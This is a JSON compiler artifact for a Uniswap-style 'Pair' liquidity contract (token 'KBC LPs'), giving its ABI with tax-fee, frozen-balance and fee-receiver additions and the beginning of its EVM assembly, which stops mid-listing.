{
	"Pair.sol": {
		"Pair": {
			"abi": [
				{
					"inputs": [],
					"payable": false,
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"anonymous": false,
					"inputs": [
						{
							"indexed": true,
							"internalType": "address",
							"name": "owner",
							"type": "address"
						},
						{
							"indexed": true,
							"internalType": "address",
							"name": "spender",
							"type": "address"
						},
						{
							"indexed": false,
							"internalType": "uint256",
							"name": "value",
							"type": "uint256"
						}
					],
					"name": "Approval",
					"type": "event"
				},
				{
					"anonymous": false,
					"inputs": [
						{
							"indexed": true,
							"internalType": "address",
							"name": "sender",
							"type": "address"
						},
						{
							"indexed": false,
							"internalType": "uint256",
							"name": "amount0",
							"type": "uint256"
						},
						{
							"indexed": false,
							"internalType": "uint256",
							"name": "amount1",
							"type": "uint256"
						},
						{
							"indexed": true,
							"internalType": "address",
							"name": "to",
							"type": "address"
						}
					],
					"name": "Burn",
					"type": "event"
				},
				{
					"anonymous": false,
					"inputs": [
						{
							"indexed": true,
							"internalType": "address",
							"name": "sender",
							"type": "address"
						},
						{
							"indexed": false,
							"internalType": "uint256",
							"name": "amount0",
							"type": "uint256"
						},
						{
							"indexed": false,
							"internalType": "uint256",
							"name": "amount1",
							"type": "uint256"
						}
					],
					"name": "Mint",
					"type": "event"
				},
				{
					"anonymous": false,
					"inputs": [
						{
							"indexed": true,
							"internalType": "address",
							"name": "sender",
							"type": "address"
						},
						{
							"indexed": false,
							"internalType": "uint256",
							"name": "amount0In",
							"type": "uint256"
						},
						{
							"indexed": false,
							"internalType": "uint256",
							"name": "amount1In",
							"type": "uint256"
						},
						{
							"indexed": false,
							"internalType": "uint256",
							"name": "amount0Out",
							"type": "uint256"
						},
						{
							"indexed": false,
							"internalType": "uint256",
							"name": "amount1Out",
							"type": "uint256"
						},
						{
							"indexed": true,
							"internalType": "address",
							"name": "to",
							"type": "address"
						}
					],
					"name": "Swap",
					"type": "event"
				},
				{
					"anonymous": false,
					"inputs": [
						{
							"indexed": false,
							"internalType": "uint112",
							"name": "reserve0",
							"type": "uint112"
						},
						{
							"indexed": false,
							"internalType": "uint112",
							"name": "reserve1",
							"type": "uint112"
						}
					],
					"name": "Sync",
					"type": "event"
				},
				{
					"anonymous": false,
					"inputs": [
						{
							"indexed": true,
							"internalType": "address",
							"name": "from",
							"type": "address"
						},
						{
							"indexed": true,
							"internalType": "address",
							"name": "to",
							"type": "address"
						},
						{
							"indexed": false,
							"internalType": "uint256",
							"name": "value",
							"type": "uint256"
						}
					],
					"name": "Transfer",
					"type": "event"
				},
				{
					"constant": true,
					"inputs": [],
					"name": "DOMAIN_SEPARATOR",
					"outputs": [
						{
							"internalType": "bytes32",
							"name": "",
							"type": "bytes32"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [],
					"name": "FeeResiver",
					"outputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": false,
					"inputs": [
						{
							"internalType": "address",
							"name": "to",
							"type": "address"
						}
					],
					"name": "Lockmint",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "liquidity",
							"type": "uint256"
						}
					],
					"payable": false,
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [],
					"name": "MINIMUM_LIQUIDITY",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [],
					"name": "PERMIT_TYPEHASH",
					"outputs": [
						{
							"internalType": "bytes32",
							"name": "",
							"type": "bytes32"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"name": "_frozenBalance",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						},
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"name": "allowance",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": false,
					"inputs": [
						{
							"internalType": "address",
							"name": "spender",
							"type": "address"
						},
						{
							"internalType": "uint256",
							"name": "value",
							"type": "uint256"
						}
					],
					"name": "approve",
					"outputs": [
						{
							"internalType": "bool",
							"name": "",
							"type": "bool"
						}
					],
					"payable": false,
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"name": "balanceOf",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": false,
					"inputs": [
						{
							"internalType": "address",
							"name": "to",
							"type": "address"
						}
					],
					"name": "burn",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "amount0",
							"type": "uint256"
						},
						{
							"internalType": "uint256",
							"name": "amount1",
							"type": "uint256"
						}
					],
					"payable": false,
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [],
					"name": "decimals",
					"outputs": [
						{
							"internalType": "uint8",
							"name": "",
							"type": "uint8"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [],
					"name": "factory",
					"outputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [],
					"name": "getReserves",
					"outputs": [
						{
							"internalType": "uint112",
							"name": "_reserve0",
							"type": "uint112"
						},
						{
							"internalType": "uint112",
							"name": "_reserve1",
							"type": "uint112"
						},
						{
							"internalType": "uint32",
							"name": "_blockTimestampLast",
							"type": "uint32"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": false,
					"inputs": [
						{
							"internalType": "address",
							"name": "_token0",
							"type": "address"
						},
						{
							"internalType": "address",
							"name": "_token1",
							"type": "address"
						},
						{
							"internalType": "uint256",
							"name": "_taxfee",
							"type": "uint256"
						}
					],
					"name": "initialize",
					"outputs": [],
					"payable": false,
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [],
					"name": "kLast",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": false,
					"inputs": [
						{
							"internalType": "address",
							"name": "to",
							"type": "address"
						}
					],
					"name": "mint",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "liquidity",
							"type": "uint256"
						}
					],
					"payable": false,
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [],
					"name": "name",
					"outputs": [
						{
							"internalType": "string",
							"name": "",
							"type": "string"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"name": "nonces",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [],
					"name": "owner",
					"outputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": false,
					"inputs": [
						{
							"internalType": "address",
							"name": "owner",
							"type": "address"
						},
						{
							"internalType": "address",
							"name": "spender",
							"type": "address"
						},
						{
							"internalType": "uint256",
							"name": "value",
							"type": "uint256"
						},
						{
							"internalType": "uint256",
							"name": "deadline",
							"type": "uint256"
						},
						{
							"internalType": "uint8",
							"name": "v",
							"type": "uint8"
						},
						{
							"internalType": "bytes32",
							"name": "r",
							"type": "bytes32"
						},
						{
							"internalType": "bytes32",
							"name": "s",
							"type": "bytes32"
						}
					],
					"name": "permit",
					"outputs": [],
					"payable": false,
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [],
					"name": "price0CumulativeLast",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [],
					"name": "price1CumulativeLast",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": false,
					"inputs": [
						{
							"internalType": "address",
							"name": "to",
							"type": "address"
						}
					],
					"name": "skim",
					"outputs": [],
					"payable": false,
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"constant": false,
					"inputs": [
						{
							"internalType": "uint256",
							"name": "amount0Out",
							"type": "uint256"
						},
						{
							"internalType": "uint256",
							"name": "amount1Out",
							"type": "uint256"
						},
						{
							"internalType": "address",
							"name": "to",
							"type": "address"
						},
						{
							"internalType": "bytes",
							"name": "data",
							"type": "bytes"
						}
					],
					"name": "swap",
					"outputs": [],
					"payable": false,
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [],
					"name": "symbol",
					"outputs": [
						{
							"internalType": "string",
							"name": "",
							"type": "string"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": false,
					"inputs": [],
					"name": "sync",
					"outputs": [],
					"payable": false,
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [],
					"name": "taxfee",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": false,
					"inputs": [
						{
							"internalType": "uint256",
							"name": "_newtax",
							"type": "uint256"
						}
					],
					"name": "taxfeeupdate",
					"outputs": [],
					"payable": false,
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [],
					"name": "token0",
					"outputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [],
					"name": "token1",
					"outputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [],
					"name": "totalSupply",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": false,
					"inputs": [
						{
							"internalType": "address",
							"name": "to",
							"type": "address"
						},
						{
							"internalType": "uint256",
							"name": "value",
							"type": "uint256"
						}
					],
					"name": "transfer",
					"outputs": [
						{
							"internalType": "bool",
							"name": "",
							"type": "bool"
						}
					],
					"payable": false,
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"constant": false,
					"inputs": [
						{
							"internalType": "address",
							"name": "from",
							"type": "address"
						},
						{
							"internalType": "address",
							"name": "to",
							"type": "address"
						},
						{
							"internalType": "uint256",
							"name": "value",
							"type": "uint256"
						}
					],
					"name": "transferFrom",
					"outputs": [
						{
							"internalType": "bool",
							"name": "",
							"type": "bool"
						}
					],
					"payable": false,
					"stateMutability": "nonpayable",
					"type": "function"
				}
			],
			"devdoc": {
				"methods": {}
			},
			"evm": {
				"assembly": "    /* \"Pair.sol\":226:18760  contract Pair is IPair, ERC20 {... */\n  mstore(0x40, 0x80)\n    /* \"Pair.sol\":325:395  address public FeeResiver = 0x9E94Ee69F3CdCd5E74e05563736E4679dA6dB44c */\n  0x06\n  dup1\n  sload\n  not(sub(shl(0xa0, 0x01), 0x01))\n  and\n    /* \"Pair.sol\":353:395  0x9E94Ee69F3CdCd5E74e05563736E4679dA6dB44c */\n  0x9e94ee69f3cdcd5e74e05563736e4679da6db44c\n    /* \"Pair.sol\":325:395  address public FeeResiver = 0x9E94Ee69F3CdCd5E74e05563736E4679dA6dB44c */\n  or\n  swap1\n  sstore\n  0x01\n    /* \"Pair.sol\":1140:1165  uint private unlocked = 1 */\n  0x10\n  sstore\n    /* \"Pair.sol\":2685:2772  constructor() public {... */\n  callvalue\n    /* \"--CODEGEN--\":5:7   */\n  dup1\n  iszero\n  tag_1\n  jumpi\n    /* \"--CODEGEN--\":30:31   */\n  0x00\n    /* \"--CODEGEN--\":27:28   */\n  dup1\n    /* \"--CODEGEN--\":20:32   */\n  revert\n    /* \"--CODEGEN--\":5:7   */\ntag_1:\n  pop\n    /* \"ERC20.sol\":1203:1336  keccak256(... */\n  mload(0x40)\n    /* \"ERC20.sol\":1107:1114  chainid */\n  chainid\n  swap1\n    /* \"ERC20.sol\":1203:1336  keccak256(... */\n  dup1\n  0x52\n  data_8b73c3c69bb8fe3d512ecc4cf759cc79239f7b179b0ffacaa9a75d522b39400f\n  dup3\n  codecopy\n  0x40\n  dup1\n  mload\n  swap2\n  dup3\n  swap1\n  sub\n  0x52\n  add\n  dup3\n  keccak256\n    /* \"ERC20.sol\":1370:1374  name */\n  dup3\n  dup3\n  add\n  dup3\n  mstore\n  0x07\n  dup1\n  dup5\n  mstore\n  shl(0xc8, 0x4b4243204c5073)\n  0x20\n  swap5\n  dup6\n  add\n  mstore\n    /* \"ERC20.sol\":1404:1414  bytes(\"1\") */\n  dup3\n  mload\n  dup1\n  dup5\n  add\n  dup5\n  mstore\n  0x01\n  dup2\n  mstore\n  shl(0xf8, 0x31)\n  swap1\n  dup6\n  add\n  mstore\n    /* \"ERC20.sol\":1175:1485  abi.encode(... */\n  dup3\n  mload\n  dup1\n  dup6\n  add\n  swap3\n  swap1\n  swap3\n  mstore\n    /* \"ERC20.sol\":1354:1376  keccak256(bytes(name)) */\n  0x6a36d39f32c2225411d16c8f56813b9117e6eb8bf3d2893c5fc62411565cfcfe\n    /* \"ERC20.sol\":1175:1485  abi.encode(... */\n  dup3\n  dup5\n  add\n  mstore\n    /* \"ERC20.sol\":1394:1415  keccak256(bytes(\"1\")) */\n  0xc89efdaa54c0f20c7adf612882df0950f5a951637e0307cdcb4c672f298b8bc6\n    /* \"ERC20.sol\":1175:1485  abi.encode(... */\n  0x60\n  dup4\n  add\n  mstore\n  0x80\n  dup3\n  add\n  swap6\n  swap1\n  swap6\n  mstore\n    /* \"ERC20.sol\":1466:1470  this */\n  address\n    /* \"ERC20.sol\":1175:1485  abi.encode(... */\n  0xa0\n  dup1\n  dup4\n  add\n  swap2\n  swap1\n  swap2\n  mstore\n  dup3\n  mload\n    /* \"--CODEGEN--\":26:47   */\n  dup1\n  dup4\n  sub\n    /* \"--CODEGEN--\":22:54   */\n  swap1\n  swap2\n  add\n    /* \"--CODEGEN--\":6:55   */\n  dup2\n  mstore\n    /* \"ERC20.sol\":1175:1485  abi.encode(... */\n  0xc0\n  swap1\n  swap2\n  add\n  swap1\n  swap2\n  mstore\n    /* \"ERC20.sol\":1152:1495  keccak256(... */\n  dup1\n  mload\n  swap2\n  add\n  keccak256\n    /* \"ERC20.sol\":1133:1149  DOMAIN_SEPARATOR */\n  0x04\n    /* \"ERC20.sol\":1133:1495  DOMAIN_SEPARATOR = keccak256(... */\n  sstore\n  pop\n    /* \"Pair.sol\":2716:2736  factory = msg.sender */\n  dup1\n  sload\n  not(sub(shl(0xa0, 0x01), 0x01))\n  swap1\n  dup2\n  and\n    /* \"Pair.sol\":2726:2736  msg.sender */\n  caller\n    /* \"Pair.sol\":2716:2736  factory = msg.sender */\n  swap1\n  dup2\n  or\n  swap1\n  swap3\n  sstore\n    /* \"Pair.sol\":2747:2752  owner */\n  0x0f\n    /* \"Pair.sol\":2747:2765  owner = msg.sender */\n  dup1\n  sload\n  swap1\n  swap2\n  and\n  swap1\n  swap2\n  or\n  swap1\n  sstore\n    /* \"Pair.sol\":226:18760  contract Pair is IPair, ERC20 {... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\ndata_8b73c3c69bb8fe3d512ecc4cf759cc79239f7b179b0ffacaa9a75d522b39400f 454950373132446f6d61696e28737472696e67206e616d652c737472696e672076657273696f6e2c75696e7432353620636861696e49642c6164647265737320766572696679696e67436f6e747261637429\n\nsub_0: assembly {\n        /* \"Pair.sol\":226:18760  contract Pair is IPair, ERC20 {... */\n      mstore(0x40, 0x80)\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_1\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_1:\n        /* \"Pair.sol\":226:18760  contract Pair is IPair, ERC20 {... */\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x70a08231\n      gt\n      tag_36\n      jumpi\n      dup1\n      0xba9a7a56\n      gt\n      tag_37\n      jumpi\n      dup1\n      0xd505accf\n      gt\n      tag_38\n      jumpi\n      dup1\n      0xd505accf\n      eq\n      tag_31\n      jumpi\n      dup1\n      0xdcbbb373\n      eq\n      tag_32\n      jumpi\n      dup1\n      0xdd62ed3e\n      eq\n      tag_33\n      jumpi\n      dup1\n      0xf317739c\n      eq\n      tag_34\n      jumpi\n      dup1\n      0xfff6cae9\n      eq\n      tag_35\n      jumpi\n      jump(tag_2)\n    tag_38:\n      dup1\n      0xba9a7a56\n      eq\n      tag_27\n      jumpi\n      dup1\n      0xbc25cf77\n      eq\n      tag_28\n      jumpi\n      dup1\n      0xc45a0155\n      eq\n      tag_29\n      jumpi\n      dup1\n      0xd21220a7\n      eq\n      tag_30\n      jumpi\n      jump(tag_2)\n    tag_37:\n      dup1\n      0x8da5cb5b\n      gt\n      tag_39\n      jumpi\n      dup1\n      0x8da5cb5b\n      eq\n      tag_23\n      jumpi\n      dup1\n      0x900820d8\n      eq\n      tag_24\n      jumpi\n      dup1\n      0x95d89b41\n      eq\n      tag_25\n      jumpi\n      dup1\n      0xa9059cbb\n      eq\n      tag_26\n      jumpi\n      jump(tag_2)\n    tag_39:\n      dup1\n      0x70a08231\n      eq\n      tag_19\n      jumpi\n      dup1\n      0x7464fc3d\n      eq\n      tag_20\n      jumpi\n      dup1\n      0x7ecebe00\n      eq\n      tag_21\n      jumpi\n      dup1\n      0x89afcb44\n      eq\n      tag_22\n      jumpi\n      jump(tag_2)\n    tag_36:\n      dup1\n      0x30adf81f\n      gt\n      tag_40\n      jumpi\n      dup1\n      0x5909c0d5\n      gt\n      tag_41\n      jumpi\n      dup1\n      0x5909c0d5\n      eq\n      tag_15\n      jumpi\n      dup1\n      0x5a3d5493\n      eq\n      tag_16\n      jumpi\n      dup1\n      0x6488f7b0\n      eq\n      tag_17\n      jumpi\n      dup1\n      0x6a627842\n      eq\n      tag_18\n      jumpi\n      jump(tag_2)\n    tag_41:\n      dup1\n      0x30adf81f\n      eq\n      tag_11\n      jumpi\n      dup1\n      0x313ce567\n      eq\n      tag_12\n      jumpi\n      dup1\n      0x3644e515\n      eq\n      tag_13\n      jumpi\n      dup1\n      0x47d5d856\n      eq\n      tag_14\n      jumpi\n      jump(tag_2)\n    tag_40:\n      dup1\n      0x0dfe1681\n      gt\n      tag_42\n      jumpi\n      dup1\n      0x0dfe1681\n      eq\n      tag_7\n      jumpi\n      dup1\n      0x1794bb3c\n      eq\n      tag_8\n      jumpi\n      dup1\n      0x18160ddd\n      eq\n      tag_9\n      jumpi\n      dup1\n      0x23b872dd\n      eq\n      tag_10\n      jumpi\n      jump(tag_2)\n    tag_42:\n      dup1\n      0x022c0d9f\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x06fdde03\n      eq\n      tag_4\n      jumpi\n      dup1\n      0x0902f1ac\n      eq\n      tag_5\n      jumpi\n      dup1\n      0x095ea7b3\n      eq\n      tag_6\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"Pair.sol\":11956:14822  function swap(... */\n    tag_3:\n      tag_43\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:16   */\n      0x80\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:17   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_44\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_44:\n        /* \"Pair.sol\":11956:14822  function swap(... */\n      dup2\n      calldataload\n      swap2\n      0x20\n      dup2\n      add\n      calldataload\n      swap2\n      sub(shl(0xa0, 0x01), 0x01)\n      0x40\n      dup4\n      add\n      calldataload\n      and\n      swap2\n      swap1\n      dup2\n      add\n      swap1\n      0x80\n      dup2\n      add\n      0x60\n      dup3\n      add\n      calldataload\n        /* \"--CODEGEN--\":21:32   */\n      0x0100000000\n        /* \"--CODEGEN--\":5:33   */\n      dup2\n      gt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_45\n      jumpi\n        /* \"--CODEGEN--\":46:47   */\n      0x00\n        /* \"--CODEGEN--\":43:44   */\n      dup1\n        /* \"--CODEGEN--\":36:48   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_45:\n        /* \"Pair.sol\":11956:14822  function swap(... */\n      dup3\n      add\n        /* \"--CODEGEN--\":35:44   */\n      dup4\n        /* \"--CODEGEN--\":28:32   */\n      0x20\n        /* \"--CODEGEN--\":12:26   */\n      dup3\n        /* \"--CODEGEN--\":8:33   */\n      add\n        /* \"--CODEGEN--\":5:45   */\n      gt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_46\n      jumpi\n        /* \"--CODEGEN--\":58:59   */\n      0x00\n        /* \"--CODEGEN--\":55:56   */\n      dup1\n        /* \"--CODEGEN--\":48:60   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_46:\n        /* \"Pair.sol\":11956:14822  function swap(... */\n      dup1\n      calldataload\n      swap1\n      0x20\n      add\n      swap2\n        /* \"--CODEGEN--\":100:109   */\n      dup5\n        /* \"--CODEGEN--\":95:96   */\n      0x01\n        /* \"--CODEGEN--\":81:93   */\n      dup4\n        /* \"--CODEGEN--\":77:97   */\n      mul\n        /* \"--CODEGEN--\":67:75   */\n      dup5\n        /* \"--CODEGEN--\":63:98   */\n      add\n        /* \"--CODEGEN--\":60:110   */\n      gt\n        /* \"--CODEGEN--\":39:50   */\n      0x0100000000\n        /* \"--CODEGEN--\":25:37   */\n      dup4\n        /* \"--CODEGEN--\":22:51   */\n      gt\n        /* \"--CODEGEN--\":11:118   */\n      or\n        /* \"--CODEGEN--\":8:10   */\n      iszero\n      tag_47\n      jumpi\n        /* \"--CODEGEN--\":131:132   */\n      0x00\n        /* \"--CODEGEN--\":128:129   */\n      dup1\n        /* \"--CODEGEN--\":121:133   */\n      revert\n        /* \"--CODEGEN--\":8:10   */\n    tag_47:\n      pop\n        /* \"Pair.sol\":11956:14822  function swap(... */\n      swap1\n      swap3\n      pop\n      swap1\n      pop\n      tag_48\n      jump\t// in\n    tag_43:\n      stop\n        /* \"ERC20.sol\":175:214  string public constant name = \"KBC LPs\" */\n    tag_4:\n      tag_49\n      tag_50\n      jump\t// in\n    tag_49:\n      0x40\n      dup1\n      mload\n      0x20\n      dup1\n      dup3\n      mstore\n      dup4\n      mload\n      dup2\n      dup4\n      add\n      mstore\n      dup4\n      mload\n      swap2\n      swap3\n      dup4\n      swap3\n      swap1\n      dup4\n      add\n      swap2\n      dup6\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n      0x00\n        /* \"--CODEGEN--\":8:108   */\n    tag_51:\n        /* \"--CODEGEN--\":33:36   */\n      dup4\n        /* \"--CODEGEN--\":30:31   */\n      dup2\n        /* \"--CODEGEN--\":27:37   */\n      lt\n        /* \"--CODEGEN--\":8:108   */\n      iszero\n      tag_53\n      jumpi\n        /* \"--CODEGEN--\":90:101   */\n      dup2\n      dup2\n      add\n        /* \"--CODEGEN--\":84:102   */\n      mload\n        /* \"--CODEGEN--\":71:82   */\n      dup4\n      dup3\n      add\n        /* \"--CODEGEN--\":64:103   */\n      mstore\n        /* \"--CODEGEN--\":52:54   */\n      0x20\n        /* \"--CODEGEN--\":45:55   */\n      add\n        /* \"--CODEGEN--\":8:108   */\n      jump(tag_51)\n    tag_53:\n        /* \"--CODEGEN--\":12:26   */\n      pop\n        /* \"ERC20.sol\":175:214  string public constant name = \"KBC LPs\" */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      swap1\n      dup2\n      add\n      swap1\n      0x1f\n      and\n      dup1\n      iszero\n      tag_54\n      jumpi\n      dup1\n      dup3\n      sub\n      dup1\n      mload\n      0x01\n      dup4\n      0x20\n      sub\n      0x0100\n      exp\n      sub\n      not\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n    tag_54:\n      pop\n      swap3\n      pop\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"Pair.sol\":1607:1908  function getReserves()... */\n    tag_5:\n      tag_55\n      tag_56\n      jump\t// in\n    tag_55:\n      0x40\n      dup1\n      mload\n      sub(shl(0x70, 0x01), 0x01)\n      swap5\n      dup6\n      and\n      dup2\n      mstore\n      swap3\n      swap1\n      swap4\n      and\n      0x20\n      dup4\n      add\n      mstore\n      0xffffffff\n      and\n      dup2\n      dup4\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x60\n      add\n      swap1\n      return\n        /* \"ERC20.sol\":2810:2957  function approve(address spender, uint256 value) external returns (bool) {... */\n    tag_6:\n      tag_57\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x40\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_58\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_58:\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":2810:2957  function approve(address spender, uint256 value) external returns (bool) {... */\n      dup2\n      calldataload\n      and\n      swap1\n      0x20\n      add\n      calldataload\n      tag_59\n      jump\t// in\n    tag_57:\n      0x40\n      dup1\n      mload\n      swap2\n      iszero\n      iszero\n      dup3\n      mstore\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x20\n      add\n      swap1\n      return\n        /* \"Pair.sol\":587:608  address public token0 */\n    tag_7:\n      tag_60\n      tag_61\n      jump\t// in\n    tag_60:\n      0x40\n      dup1\n      mload\n      sub(shl(0xa0, 0x01), 0x01)\n      swap1\n      swap3\n      and\n      dup3\n      mstore\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x20\n      add\n      swap1\n      return\n        /* \"Pair.sol\":2834:3108  function initialize(... */\n    tag_8:\n      tag_43\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x60\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_63\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_63:\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"Pair.sol\":2834:3108  function initialize(... */\n      dup2\n      calldataload\n      dup2\n      and\n      swap2\n      0x20\n      dup2\n      add\n      calldataload\n      swap1\n      swap2\n      and\n      swap1\n      0x40\n      add\n      calldataload\n      tag_64\n      jump\t// in\n        /* \"ERC20.sol\":307:333  uint256 public totalSupply */\n    tag_9:\n      tag_65\n      tag_66\n      jump\t// in\n    tag_65:\n      0x40\n      dup1\n      mload\n      swap2\n      dup3\n      mstore\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x20\n      add\n      swap1\n      return\n        /* \"ERC20.sol\":3108:3469  function transferFrom(... */\n    tag_10:\n      tag_57\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x60\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_68\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_68:\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":3108:3469  function transferFrom(... */\n      dup2\n      calldataload\n      dup2\n      and\n      swap2\n      0x20\n      dup2\n      add\n      calldataload\n      swap1\n      swap2\n      and\n      swap1\n      0x40\n      